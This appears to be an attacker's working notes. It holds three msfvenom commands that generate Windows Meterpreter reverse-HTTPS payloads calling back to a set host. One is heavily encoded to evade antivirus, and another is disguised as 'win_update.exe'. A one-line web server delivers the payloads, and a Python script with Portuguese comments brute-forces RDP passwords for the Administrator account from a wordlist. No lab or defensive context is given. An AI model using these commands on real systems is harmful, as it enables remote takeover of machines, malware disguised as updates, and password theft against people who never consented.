msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

import subprocess

ip_alvo = "SEU_IP_AQUI"
usuario = "Administrator"
wordlist_path = "/caminho/para/wordlist_atibaia.txt"

with open(wordlist_path, "r") as file:
    senhas = file.read().splitlines()

for senha in senhas:
    print(f"Tentando senha: {senha}")
    comando = [
        "xfreerdp",
        f"/u:{usuario}",
        f"/p:{senha}",
        f"/v:{ip_alvo}",
        "/cert:ignore",
        "+auth-only"  # importante: apenas tenta autenticar sem abrir sessão gráfica
    ]

    resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if "Authentication only, exit status 0" in resultado.stdout:
        print(f"\n✅ Senha encontrada: {senha}")
        break
    else:
        print("Falha.\n")

print("Fim do processo.")

